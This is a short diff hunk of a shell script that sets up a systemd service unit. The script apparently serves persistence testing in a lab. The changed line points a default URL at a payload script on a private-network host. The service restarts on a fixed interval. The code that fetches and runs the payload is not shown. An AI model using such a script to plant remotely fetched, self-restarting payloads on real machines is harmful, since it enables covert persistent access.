@@ -8,7 +8,7 @@ UNIT_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
 SHELL_BIN="/bin/sh"
 RESTART_POLICY="always"
 RESTART_SEC="10"
-DEFAULT_URL="http://192.168.56.2:8000/payload.sh"
+DEFAULT_URL="http://192.168.56.2:8000/payloads/payload_systemd.sh"
 
 log(){
   echo "[$(date +'%F %T')] $*";
